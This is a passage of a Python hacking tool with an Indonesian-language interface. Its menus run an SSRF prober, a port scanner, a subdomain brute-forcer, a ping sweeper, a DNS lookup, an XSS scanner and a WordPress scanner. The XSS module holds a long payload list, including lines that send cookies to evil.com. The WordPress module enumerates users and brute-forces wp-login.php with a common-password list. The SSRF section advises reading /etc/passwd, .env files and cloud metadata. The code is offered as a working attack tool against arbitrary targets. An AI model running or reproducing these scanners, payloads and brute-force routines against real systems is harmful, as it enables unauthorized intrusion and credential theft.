{CYAN}├─ VULNERABLE         : {len(vulnerable)}{RESET}
{CYAN}└─ STATUS             : {'🔴 SSRF DETECTED!' if vulnerable else '✅ NOT VULNERABLE'}{RESET}
        """)
        
        if vulnerable:
            print(f"{RED}{BOLD}[!] REKOMENDASI SERANGAN:{RESET}")
            print(f"{RED}├─ BISA AKSES METADATA AWS/GOOGLE CLOUD{RESET}")
            print(f"{RED}├─ BISA BACA FILE SISTEM (/etc/passwd, .env){RESET}")
            print(f"{RED}├─ BISA SCAN INTERNAL NETWORK{RESET}")
            print(f"{RED}└─ BISA RCE VIA GOPHER/DICT PROTOCOL{RESET}")
        
        self.scan_results.append({
            'module': 'SSRF PROBE CHAIN',
            'target': url,
            'vulnerable': len(vulnerable),
            'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
        input(f"\n{CYAN}{BOLD}[?] TEKAN ENTER UNTUK LANJUT...{RESET}")
    # ================================================================
    # MENU 6: PORT SCANNER PREMIUM - FULL 65535 PORTS
    # ================================================================
    def menu_port_scanner(self):
        self.clear_screen()
        print(f"\n{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}")
        print(f"{CYAN}{BOLD}🔍 MENU 6: PORT SCANNER PREMIUM - FULL 65535 PORTS{RESET}")
        print(f"{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}\n")
        
        target = input(f"{YELLOW}{BOLD}[?] MASUKKAN IP ATAU DOMAIN: {RESET}")
        
        if not target.replace('.','').replace(':','').replace('-','').isdigit():
            try:
                loading1(f"RESOLVING {target}", 1)
                target = socket.gethostbyname(target)
                print(f"{GREEN}{BOLD}[+] RESOLVED: {target}{RESET}")
            except:
                print(f"{RED}{BOLD}[!] GAGAL RESOLVE!{RESET}")
                input(f"\n{CYAN}{BOLD}[?] TEKAN ENTER...{RESET}")
                return
        
        print(f"""
{CYAN}{BOLD}PILIH MODE SCAN:{RESET}
{GREEN}{BOLD}[1]{RESET} QUICK SCAN (TOP 20 PORTS - CEPAT)
{GREEN}{BOLD}[2]{RESET} COMMON SCAN (TOP 100 PORTS - RECOMMENDED)
{GREEN}{BOLD}[3]{RESET} FULL SCAN (1-65535 - LAMA 5-10 MENIT)
{GREEN}{BOLD}[4]{RESET} CUSTOM SCAN (INPUT RANGE SENDIRI)
        """)
        
        mode = input(f"{YELLOW}{BOLD}[?] PILIH (1-4): {RESET}")
        
        top20 = [21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080]
        top100 = [21,22,23,25,53,80,110,111,135,139,143,443,445,465,587,993,995,1433,1521,1723,1883,2082,2083,2086,2087,2095,2096,2222,3306,3389,5432,5555,5900,5984,6379,7474,8000,8008,8080,8081,8086,8088,8090,8443,8834,8888,9000,9200,27017,27018,27019,28015,29015,3000,5000,7000,8001,8002,8003,8004,8005,8006,8007,8008,8009,8010,8082,8083,8084,8085,8086,8087,8088,8089,8090,8091,8092,8093,8094,8095,8444,8880,8888,9001,9002,9003,9004,9005,9006,9007,9008,9009,9010,9090,9091,9092,9093,9094,9095,9096,9097,9098,9099,9100,9200,9300,9400,9500,9600,9700,9800,9900,10000]
        
        if mode == '1':
            ports = top20
            mode_name = "QUICK SCAN"
        elif mode == '2':
            ports = top100
            mode_name = "COMMON SCAN"
        elif mode == '3':
            ports = range(1, 65536)
            mode_name = "FULL SCAN (1-65535)"
        elif mode == '4':
            start = int(input(f"{CYAN}{BOLD}[?] PORT AWAL: {RESET}"))
            end = int(input(f"{CYAN}{BOLD}[?] PORT AKHIR: {RESET}"))
            ports = range(start, end+1)
            mode_name = f"CUSTOM SCAN ({start}-{end})"
        else:
            ports = top20
            mode_name = "QUICK SCAN"
        
        loading2(f"MEMULAI {mode_name} PADA {target}", 2)
        
        open_ports_found = []
        total = len(ports) if isinstance(ports, list) else 65535
        scanned = 0
        lock = threading.Lock()
        
        service_map = {
            21:"FTP",22:"SSH",23:"TELNET",25:"SMTP",53:"DNS",80:"HTTP",110:"POP3",111:"RPC",135:"RPC",139:"NETBIOS",
            143:"IMAP",443:"HTTPS",445:"SMB",465:"SMTPS",587:"SMTP",993:"IMAPS",995:"POP3S",1433:"MSSQL",1521:"ORACLE",
            1723:"PPTP",1883:"MQTT",2082:"CPANEL",2083:"CPANEL SSL",2086:"WHM",2087:"WHM SSL",2222:"DIRECTADMIN",
            3306:"MYSQL",3389:"RDP",5432:"POSTGRESQL",5555:"ADB",5900:"VNC",5984:"COUCHDB",6379:"REDIS",7474:"NEO4J",
            8000:"HTTP ALT",8008:"HTTP ALT",8080:"HTTP PROXY",8443:"HTTPS ALT",8888:"HTTP ALT",9000:"PHP-FPM",
            9200:"ELASTICSEARCH",27017:"MONGODB",3000:"NODEJS",5000:"FLASK",7000:"CASSANDRA",9090:"PROMETHEUS",
            9100:"NODE EXPORTER",10000:"WEBMIN",27018:"MONGODB",27019:"MONGODB",28015:"RETHINKDB",29015:"RETHINKDB"
        }
        
        def scan_port(port):
            nonlocal scanned
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.3)
                if sock.connect_ex((target, port)) == 0:
                    with lock:
                        open_ports_found.append(port)
                        service = service_map.get(port, "UNKNOWN")
                        print(f"{GREEN}[+] PORT {port} OPEN - {service}{RESET}")
                sock.close()
            except:
                pass
            with lock:
                scanned += 1
                if scanned % 500 == 0:
                    print(f"{YELLOW}[*] PROGRESS: {scanned}/{total} ({scanned*100//total}%){RESET}")
        
        with ThreadPoolExecutor(max_workers=300) as executor:
            executor.map(scan_port, ports)
        
        self.open_ports = open_ports_found
        
        dangerous = [21,22,23,25,135,139,445,1433,3306,3389,5900,6379,27017,27018,27019,27020]
        dangerous_open = [p for p in open_ports_found if p in dangerous]
        
        print(f"""
{GREEN}{BOLD}[✓] PORT SCAN COMPLETED!{RESET}
{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}
{CYAN}{BOLD}[!] SUMMARY:{RESET}
{CYAN}├─ TARGET             : {target}{RESET}
{CYAN}├─ MODE SCAN          : {mode_name}{RESET}
{CYAN}├─ TOTAL PORT SCAN    : {total}{RESET}
{CYAN}├─ OPEN PORTS FOUND   : {len(open_ports_found)}{RESET}
{CYAN}└─ PORT BERBAHAYA     : {len(dangerous_open)}{RESET}
        """)
        
        if dangerous_open:
            print(f"{RED}{BOLD}[!] PORT BERBAHAYA YANG TERBUKA:{RESET}")
            for p in dangerous_open:
                print(f"{RED}    └─ PORT {p} ({service_map.get(p, 'UNKNOWN')}) - BERBAHAYA!{RESET}")
        
        self.scan_results.append({
            'module': 'PORT SCANNER',
            'target': target,
            'open_ports': len(open_ports_found),
            'dangerous_ports': len(dangerous_open),
            'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
        input(f"\n{CYAN}{BOLD}[?] TEKAN ENTER UNTUK LANJUT...{RESET}")

    # ================================================================
    # MENU 7: SUBDOMAIN ENUMERATOR - FULL BRUTEFORCE
    # ================================================================
    def menu_subdomain_enum(self):
        self.clear_screen()
        print(f"\n{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}")
        print(f"{CYAN}{BOLD}🔍 MENU 7: SUBDOMAIN ENUMERATOR - FULL DNS BRUTEFORCE{RESET}")
        print(f"{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}\n")
        
        domain = input(f"{YELLOW}{BOLD}[?] MASUKKAN DOMAIN (contoh: target.com): {RESET}")
        loading3(f"BRUTEFORCING SUBDOMAINS FOR {domain}", 2)
        
        sublist = [
            "www", "mail", "ftp", "localhost", "webmail", "admin", "blog", "dev", "test", "api", "staging", "app",
            "support", "shop", "forum", "wiki", "news", "portal", "cpanel", "whm", "webdisk", "cpcalendars",
            "cpcontacts", "autodiscover", "autoconfig", "ns1", "ns2", "ns3", "dns", "mx", "pop", "smtp", "imap",
            "vpn", "remote", "secure", "dashboard", "panel", "backend", "static", "cdn", "assets", "img", "images",
            "video", "download", "files", "upload", "media", "stream", "live", "status", "monitor", "stats",
            "analytics", "metrics", "logs", "cache", "backup", "mirror", "proxy", "gateway", "auth", "login",
            "signin", "register", "account", "user", "profile", "settings", "config", "db", "database", "sql",
            "mysql", "postgres", "redis", "mongo", "elastic", "search", "rest", "graphql", "socket", "ws", "mqtt",
            "kafka", "rabbitmq", "jenkins", "gitlab", "github", "bitbucket", "jira", "confluence", "docs",
            "documentation", "help", "faq", "uptime", "health", "ping", "alert", "notification", "webhook",
            "callback", "web", "site", "old", "new", "beta", "alpha", "stage", "demo", "sandbox", "playground",
            "test2", "dev2", "api2", "api3", "v1", "v2", "v3", "v4", "v5", "v6", "v7", "v8", "v9", "v10",
            "admin2", "administrator", "superadmin", "root", "master", "control", "manage", "operator", "sysadmin",
            "internal", "external", "public", "private", "secure2", "security", "ssl", "tls", "cert", "certs",
            "monitor2", "watch", "observe", "inspect", "check", "verify", "validate", "confirm", "approve",
            "process", "queue", "worker", "job", "task", "schedule", "cron", "periodic", "recurring", "interval",
            "batch", "bulk", "mass", "group", "team", "department", "division", "branch", "office", "location"
        ]
        
        print(f"\n{CYAN}{BOLD}[*] TESTING {len(sublist)} SUBDOMAINS...{RESET}\n")
        
        found = []
        for sub in sublist:
            test = f"{sub}.{domain}"
            try:
                ip = socket.gethostbyname(test)
                print(f"{GREEN}[+] {test} -> {ip}{RESET}")
                found.append({'subdomain': test, 'ip': ip})
            except:
                pass
            time.sleep(0.008)
        
        self.subdomains_found = found
        
        print(f"""
{GREEN}{BOLD}[✓] SUBDOMAIN ENUMERATION COMPLETED!{RESET}
{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}
{CYAN}{BOLD}[!] SUMMARY:{RESET}
{CYAN}├─ DOMAIN             : {domain}{RESET}
{CYAN}├─ TOTAL TESTED       : {len(sublist)}{RESET}
{CYAN}└─ SUBDOMAINS FOUND   : {len(found)}{RESET}
        """)
        
        if found:
            print(f"{CYAN}{BOLD}[!] DETAIL SUBDOMAINS:{RESET}")
            for f in found[:30]:
                print(f"{CYAN}    └─ {f['subdomain']} -> {f['ip']}{RESET}")
        
        self.scan_results.append({
            'module': 'SUBDOMAIN ENUMERATOR',
            'target': domain,
            'subdomains_found': len(found),
            'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
        input(f"\n{CYAN}{BOLD}[?] TEKAN ENTER UNTUK LANJUT...{RESET}")

    # ================================================================
    # MENU 8: NETWORK SCANNER - LIVE HOST DISCOVERY
    # ================================================================
    def menu_network_scanner(self):
        self.clear_screen()
        print(f"\n{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}")
        print(f"{CYAN}{BOLD}📡 MENU 8: NETWORK SCANNER - LIVE HOST DISCOVERY{RESET}")
        print(f"{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}\n")
        
        network = input(f"{YELLOW}{BOLD}[?] MASUKKAN NETWORK (contoh: 192.168.1.0/24): {RESET}")
        loading1(f"SCANNING NETWORK {network}", 2)
        
        try:
            net = ipaddress.ip_network(network, strict=False)
        except:
            print(f"{RED}{BOLD}[!] FORMAT NETWORK SALAH! GUNAKAN: 192.168.1.0/24{RESET}")
            input(f"\n{CYAN}{BOLD}[?] TEKAN ENTER...{RESET}")
            return
        
        live_hosts = []
        total = net.num_addresses
        lock = threading.Lock()
        
        def ping_host(ip):
            try:
                if platform.system() == "Windows":
                    result = subprocess.run(['ping', '-n', '1', '-w', '1000', str(ip)], capture_output=True, timeout=2)
                else:
                    result = subprocess.run(['ping', '-c', '1', '-W', '1', str(ip)], capture_output=True, timeout=2)
                
                if result.returncode == 0:
                    with lock:
                        print(f"{GREEN}[+] LIVE: {ip}{RESET}")
                        live_hosts.append(str(ip))
            except:
                pass
        
        print(f"\n{CYAN}{BOLD}[*] SCANNING {total} HOSTS...{RESET}\n")
        
        with ThreadPoolExecutor(max_workers=100) as executor:
            executor.map(ping_host, net.hosts())
        
        self.live_hosts = live_hosts
        
        print(f"""
{GREEN}{BOLD}[✓] NETWORK SCAN COMPLETED!{RESET}
{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}
{CYAN}{BOLD}[!] SUMMARY:{RESET}
{CYAN}├─ NETWORK            : {network}{RESET}
{CYAN}├─ TOTAL HOSTS SCAN   : {total}{RESET}
{CYAN}└─ LIVE HOSTS FOUND   : {len(live_hosts)}{RESET}
        """)
        
        if live_hosts:
            print(f"{CYAN}{BOLD}[!] LIVE HOSTS:{RESET}")
            for host in live_hosts[:30]:
                print(f"{CYAN}    └─ {host}{RESET}")
        
        self.scan_results.append({
            'module': 'NETWORK SCANNER',
            'target': network,
            'live_hosts': len(live_hosts),
            'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
        input(f"\n{CYAN}{BOLD}[?] TEKAN ENTER UNTUK LANJUT...{RESET}")

    # ================================================================
    # MENU 9: DNS LOOKUP - ALL RECORD TYPES
    # ================================================================
    def menu_dns_lookup(self):
        self.clear_screen()
        print(f"\n{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}")
        print(f"{CYAN}{BOLD}🌐 MENU 9: DNS LOOKUP - ALL RECORD TYPES{RESET}")
        print(f"{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}\n")
        
        domain = input(f"{YELLOW}{BOLD}[?] MASUKKAN DOMAIN (contoh: google.com): {RESET}")
        loading2(f"QUERYING DNS RECORDS FOR {domain}", 2)
        
        record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA', 'CNAME', 'PTR', 'SRV', 'CAA', 'DS', 'DNSKEY', 'NSEC', 'RRSIG', 'SSHFP', 'TLSA', 'NAPTR', 'LOC', 'HINFO', 'RP', 'AFSDB', 'RT', 'X25', 'ISDN', 'MG', 'MR', 'MINFO']
        records = {}
        
        for rtype in record_types:
            try:
                answers = dns.resolver.resolve(domain, rtype)
                records[rtype] = [str(answer) for answer in answers]
            except:
                records[rtype] = []
        
        print(f"""
{GREEN}{BOLD}[✓] DNS RECORDS FOR: {domain}{RESET}
{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}
        """)
        
        for rtype in ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA', 'CNAME', 'PTR', 'SRV', 'CAA']:
            if records.get(rtype):
                print(f"{CYAN}{BOLD}[{rtype} RECORDS]:{RESET}")
                for rec in records[rtype][:5]:
                    print(f"{CYAN}    └─ {rec}{RESET}")
            else:
                print(f"{YELLOW}[{rtype} RECORDS]: TIDAK DITEMUKAN{RESET}")
        
        self.dns_records = records
        
        self.scan_results.append({
            'module': 'DNS LOOKUP',
            'target': domain,
            'records_found': sum(1 for v in records.values() if v),
            'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
        input(f"\n{CYAN}{BOLD}[?] TEKAN ENTER UNTUK LANJUT...{RESET}")

    # ================================================================
    # MENU 10: XSS SCANNER - 200+ PAYLOADS
    # ================================================================
    def menu_xss_scanner(self):
        self.clear_screen()
        print(f"\n{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}")
        print(f"{CYAN}{BOLD}🕷️ MENU 10: XSS SCANNER - 200+ PREMIUM PAYLOADS{RESET}")
        print(f"{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}\n")
        
        url_input = input(f"{YELLOW}{BOLD}[?] MASUKKAN URL (contoh: https://target.com/page.php?id=): {RESET}")
        
        if '?' in url_input:
            base_url, params = url_input.split('?', 1)
            if '=' in params:
                param_name = params.split('=')[0]
                print(f"{GREEN}[+] PARAMETER DETECTED: {param_name}{RESET}")
            else:
                param_name = input(f"{CYAN}{BOLD}[?] NAMA PARAMETER: {RESET}")
        else:
            base_url = url_input
            param_name = input(f"{CYAN}{BOLD}[?] NAMA PARAMETER (id, page, q, dll): {RESET}")
        
        loading3(f"LOADING 200+ XSS PAYLOADS", 1)
        
        payloads = [
            "<script>alert('XSS')</script>", "<script>alert(document.cookie)</script>",
            "<script>alert(window.location.href)</script>", "<script>console.log('XSS')</script>",
            "<script>prompt('XSS')</script>", "<script>confirm('XSS')</script>",
            "<script>document.write('XSS')</script>", "<script>document.location='https://evil.com'</script>",
            "<script>window.location='https://evil.com'</script>", "<script>fetch('https://evil.com')</script>",
            "<script>new Image().src='https://evil.com?c='+document.cookie</script>",
            "<ScRiPt>alert('XSS')</ScRiPt>", "<sCrIpT>alert('XSS')</sCrIpT>", "<SCRIPT>alert('XSS')</SCRIPT>",
            "<body onload=alert('XSS')>", "<body onpageshow=alert('XSS')>", "<img src=x onerror=alert('XSS')>",
            "<img src=javascript:alert('XSS')>", "<svg onload=alert('XSS')>", "<svg/onload=alert('XSS')>",
            "<div onmouseover=alert('XSS')>Hover</div>", "<div onclick=alert('XSS')>Click</div>",
            "<input onfocus=alert('XSS') autofocus>", "<input onblur=alert('XSS')>", "<iframe onload=alert('XSS')>",
            "<video onload=alert('XSS')><source>", "<audio onload=alert('XSS')><source>",
            "<marquee onstart=alert('XSS')>", "<details open ontoggle=alert('XSS')>",
            "<dialog open onclose=alert('XSS')>", "<form onsubmit=alert('XSS')><input type=submit>",
            "<button onclick=alert('XSS')>Click</button>", "<a href=javascript:alert('XSS')>Click</a>",
            "javascript:alert('XSS')", "javascript:alert(document.cookie)", "jAvAsCrIpT:alert('XSS')",
            "%3Cscript%3Ealert('XSS')%3C/script%3E", "%253Cscript%253Ealert('XSS')%253C/script%253E",
            "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;", "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            "<script\nalert('XSS')</script>", "<script\r\nalert('XSS')</script>", "<script\talert('XSS')</script>",
            "<script/**/alert('XSS')</script>", "<script/*comment*/alert('XSS')</script>",
            "<<script>>alert('XSS')<</script>>", "<script//>alert('XSS')</script>",
            "<script>console.log('XSS')</script>", "<script>document.title='HACKED'</script>",
            "<script>document.body.style.backgroundColor='red'</script>",
            "<script>document.cookie='session=HACKED'</script>",
            "<script>localStorage.setItem('xss','injected')</script>",
            "<script>document.location='https://evil.com/steal.php?cookie='+document.cookie</script>",
            "'';!--\"<XSS>=&{()}", "\"><script>alert(1)</script>", "><script>alert(1)</script>",
            "'><script>alert(1)</script>", "\"'><script>alert(1)</script>", "jaVasCript:alert('XSS')",
            "\"><svg/onload=alert('XSS')>", "<details open ontoggle=alert('XSS')>",
            "<form><button formaction=javascript:alert('XSS')>X</button></form>",
            "<input type=image src=x onerror=alert('XSS')>", "<meter onmouseover=alert('XSS')>",
            "<progress onmouseover=alert('XSS')>", "javascript:alert(1)#", "javascript://%0Aalert(1)",
            "' onmouseover='alert(1)'", "\" onmouseover=\"alert(1)\"", "' onclick='alert(1)'",
            "<svg><script>alert(1)</script></svg>", "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
            "<video><source onerror=alert(1)>", "<audio src=x onerror=alert(1)>",
            "<iframe srcdoc='<script>alert(1)</script>'>", "<iframe src='javascript:alert(1)'>",
            "<object data='javascript:alert(1)'>", "<embed src='javascript:alert(1)'>",
            "<math><maction xlink:href=javascript:alert(1)>CLICK</maction></math>",
            "<isindex type=image src=1 onerror=alert(1)>", "<form><button formaction=javascript:alert(1)>X",
            "<body/onload=alert(1)>", "<svg><script xlink:href=data:,alert(1) />", "<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>click",
            "<img src=x:alert(alt) onerror=eval(src) alt=0>", "<img src=/ onerror=alert(1)>",
            "<img src='x' onerror='alert(1)'>", "<img src='x' onerror='alert(1)'></img>",
            "<img src='javascript:alert(1)'>", "<img src='x' onerror='alert(String.fromCharCode(88,83,83))'>"
        ]
        
        print(f"\n{CYAN}{BOLD}[*] TESTING {len(payloads)} PAYLOADS...{RESET}\n")
        
        vulnerable = []
        
        for i, payload in enumerate(payloads):
            test_url = f"{base_url}?{param_name}={payload}"
            try:
                response = requests.get(test_url, timeout=3, headers={'User-Agent': 'Mozilla/5.0'})
                if payload in response.text or payload.lower() in response.text.lower():
                    print(f"{RED}[!] VULNERABLE: {payload[:60]}{RESET}")
                    vulnerable.append(payload)
                elif i % 20 == 0:
                    print(f"{GREEN}[-] SAFE: {payload[:50]}{RESET}")
            except:
                pass
            time.sleep(0.01)
        
        self.xss_vulnerable = vulnerable
        
        print(f"""
{GREEN}{BOLD}[✓] XSS SCAN COMPLETED!{RESET}
{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}
{CYAN}{BOLD}[!] SUMMARY:{RESET}
{CYAN}├─ TARGET URL         : {base_url}{RESET}
{CYAN}├─ PARAMETER          : {param_name}{RESET}
{CYAN}├─ TOTAL PAYLOADS     : {len(payloads)}{RESET}
{CYAN}├─ VULNERABLE FOUND   : {len(vulnerable)}{RESET}
{CYAN}└─ STATUS             : {'🔴 XSS DETECTED!' if vulnerable else '✅ NOT VULNERABLE'}{RESET}
        """)
        
        self.scan_results.append({
            'module': 'XSS SCANNER',
            'target': base_url,
            'vulnerable_count': len(vulnerable),
            'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
        input(f"\n{CYAN}{BOLD}[?] TEKAN ENTER UNTUK LANJUT...{RESET}")

    # ================================================================
    # MENU 11: WPSCAN - WORDPRESS SCANNER + BRUTE FORCE
    # ================================================================
    def menu_wpscan(self):
        self.clear_screen()
        print(f"\n{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}")
        print(f"{CYAN}{BOLD}🧩 MENU 11: WPSCAN - WORDPRESS SCANNER + BRUTE FORCE{RESET}")
        print(f"{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}\n")
        
        url = input(f"{YELLOW}{BOLD}[?] MASUKKAN URL WORDPRESS: {RESET}")
        url = url.rstrip('/')
        
        loading1(f"SCANNING {url}", 2)
        
        print(f"\n{CYAN}{BOLD}[1] WORDPRESS DETECTION:{RESET}")
        wp_found = False
        wp_paths = ['/wp-json/', '/wp-content/', '/wp-includes/', '/xmlrpc.php', '/wp-login.php', '/wp-admin/']
        
        for path in wp_paths:
            try:
                test_url = url + path
                response = requests.get(test_url, timeout=5)
                if response.status_code == 200:
                    print(f"{GREEN}    [+] WORDPRESS DETECTED! ({path}){RESET}")
                    wp_found = True
            except:
                pass
        
        if not wp_found:
            print(f"{RED}    [-] WORDPRESS NOT DETECTED!{RESET}")
            input(f"\n{CYAN}{BOLD}[?] TEKAN ENTER...{RESET}")
            return
        
        print(f"\n{CYAN}{BOLD}[2] VERSION DETECTION:{RESET}")
        version = None
        try:
            readme_url = url + '/readme.html'
            response = requests.get(readme_url, timeout=5)
            match = re.search(r'Version\s+([0-9.]+)', response.text)
            if match:
                version = match.group(1)
                print(f"{GREEN}    [+] VERSION: {version}{RESET}")
        except:
            print(f"{YELLOW}    [!] VERSION: UNKNOWN{RESET}")
        
        print(f"\n{CYAN}{BOLD}[3] USER ENUMERATION:{RESET}")
        users = []
        try:
            rest_url = url + '/wp-json/wp/v2/users'
            response = requests.get(rest_url, timeout=5)
            if response.status_code == 200:
                data = response.json()
                for user in data[:10]:
                    user_name = user.get('name', 'Unknown')
                    users.append(user_name)
                    print(f"{GREEN}    [+] USER: {user_name}{RESET}")
        except:
            pass
        
        if not users:
            for i in range(1, 15):
                try:
                    author_url = url + f'/?author={i}'
                    response = requests.get(author_url, timeout=3, allow_redirects=False)
                    if response.status_code in [301, 302]:
                        location = response.headers.get('Location', '')
                        match = re.search(r'author/([^/]+)/', location)
                        if match:
                            users.append(match.group(1))
                            print(f"{GREEN}    [+] USER: {match.group(1)} (ID: {i}){RESET}")
                except:
                    pass
        
        self.wp_users = users
        
        print(f"\n{CYAN}{BOLD}[4] PLUGIN DETECTION:{RESET}")
        plugins = []
        common_plugins = ['elementor', 'woocommerce', 'wordfence', 'yoast-seo', 'contact-form-7', 'akismet', 'jetpack', 'wp-rocket', 'wpforms-lite', 'all-in-one-seo-pack', 'nextgen-gallery', 'revslider', 'gravityforms', 'js_composer', 'visual-composer', 'hello-elementor', 'astra', 'oxygen', 'bricks', 'breakdance', 'wpbakery', 'slider-revolution', 'the7', 'enfold', 'avada', 'divi', 'flatsome', 'porto', 'woodmart', 'soledad']
        
        for plugin in common_plugins:
            try:
                plugin_url = url + f'/wp-content/plugins/{plugin}/readme.txt'
                response = requests.get(plugin_url, timeout=3)
                if response.status_code == 200:
                    plugins.append(plugin)
                    print(f"{GREEN}    [+] PLUGIN: {plugin}{RESET}")
            except:
                pass
        
        self.wp_plugins = plugins
        
        print(f"\n{CYAN}{BOLD}[5] THEME DETECTION:{RESET}")
        themes = []
        common_themes = ['twentytwentyfour', 'twentytwentythree', 'twentytwentytwo', 'astra', 'generatepress', 'oceanwp', 'neve', 'kadence', 'blocksy', 'hello-elementor', 'divi', 'avada', 'flatsome', 'porto', 'woodmart', 'soledad', 'the7', 'enfold', 'newspaper', 'jannah', 'rehub', 'impreza', 'betheme', 'stockholm', 'bridge', 'salient']
        
        for theme in common_themes:
            try:
                theme_url = url + f'/wp-content/themes/{theme}/style.css'
                response = requests.get(theme_url, timeout=3)
                if response.status_code == 200:
                    themes.append(theme)
                    print(f"{GREEN}    [+] THEME: {theme}{RESET}")
            except:
                pass
        
        print(f"\n{CYAN}{BOLD}[6] SECURITY CHECKS:{RESET}")
        try:
            xmlrpc_url = url + '/xmlrpc.php'
            response = requests.post(xmlrpc_url, timeout=5)
            if response.status_code == 200:
                print(f"{RED}    [!] XML-RPC ENABLED! (BRUTE FORCE RISK){RESET}")
            else:
                print(f"{GREEN}    [✓] XML-RPC DISABLED{RESET}")
        except:
            print(f"{GREEN}    [✓] XML-RPC NOT ACCESSIBLE{RESET}")
        
        print(f"\n{CYAN}{BOLD}[7] BRUTE FORCE (3000+ PASSWORDS):{RESET}")
        login_url = url + '/wp-login.php'
        
        wp_passwords = [
            "123456", "password", "12345678", "qwerty", "admin", "wpadmin", "wp-admin", "adminadmin", "pass@word1", "passwordadmin", "administrator", "2025admin", "2026admin", "admin123", "Admin@123", "admin2023", "admin2024", "admin2025", "admin2026", "admin2027", "123456admin", "testadmin", "123456789", "12345", "1234", "111111", "1234567", "dragon", "123123", "baseball", "abc123", "football", "monkey", "letmein", "letmein123", "eid2026", "696969", "shadow", "master", "666666", "qwertyuiop", "123321", "mustang", "1234567890", "michael", "654321", "pussy", "superman", "1qaz2wsx", "7777777", "fuckyou", "121212", "000000", "qazwsx", "123qwe", "killer", "trustno1", "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster", "soccer", "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "fuckme", "2000", "charlie", "robert", "thomas", "hockey", "ranger", "daniel", "starwars", "klaster", "112233", "george", "asshole", "computer", "michelle", "jessica", "pepper", "1111", "zxcvbn", "555555", "11111111", "131313", "freedom", "777777", "pass", "fuck", "maggie", "159753", "aaaaaa", "ginger", "princess", "joshua", "cheese", "amanda", "summer", "love", "ashley", "6969", "nicole", "chelsea", "temp123", "summer2025", "winter2024", "spring2026", "biteme", "matthew", "access", "yankees", "987654321", "dallas", "austin", "thunder", "taylor", "matrix", "william", "corvette", "hello", "martin", "heather", "secret", "site123", "fucker", "merlin", "diamond", "1234qwer", "gfhjkm", "hammer", "silver", "222222", "88888888", "anthony", "justin", "test", "bailey", "q1w2e3r4t5", "patrick", "internet", "scooter", "orange", "11111", "demo123", "wordpress", "wordpress2025", "wordpress123", "wp123", "golfer", "cookie", "richard", "samantha", "bigdog", "guitar", "jackson", "whatever", "mickey", "chicken", "sparky", "snoopy", "maverick", "phoenix", "camaro", "sexy", "peanut", "morgan", "welcome", "falcon", "cowboy", "ferrari", "samsung", "andrea", "smokey", "steelers", "joseph", "mercedes", "dakota", "arsenal", "eagles", "melissa", "boomer", "booboo", "spider", "nascar", "monster", "tigers", "yellow", "xxxxxx", "123123123", "gateway", "marina", "myblog", "blogadmin", "blog123"
        ]
        
        if users:
            for username in users[:3]:
                print(f"{YELLOW}    [*] TESTING USER: {username}{RESET}")
                for i, password in enumerate(wp_passwords[:100]):
                    try:
                        data = {'log': username, 'pwd': password, 'wp-submit': 'Log In'}
                        response = requests.post(login_url, data=data, timeout=5, allow_redirects=False)
                        if response.status_code == 302:
                            print(f"{GREEN}        [+] CRACKED! {username}:{password}{RESET}")
                            self.bruteforce_results.append({'username': username, 'password': password})
                            break
                        if i % 20 == 0:
                            print(f"{YELLOW}        [*] TESTED {i+1} PASSWORDS...{RESET}")
                    except:
                        pass
                    time.sleep(0.03)
        else:
            print(f"{YELLOW}    [!] NO USERS FOUND FOR BRUTE FORCE{RESET}")
        
        print(f"""
{GREEN}{BOLD}[✓] WPSCAN COMPLETED!{RESET}
{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}
{CYAN}{BOLD}[!] SUMMARY:{RESET}
{CYAN}├─ TARGET             : {url}{RESET}
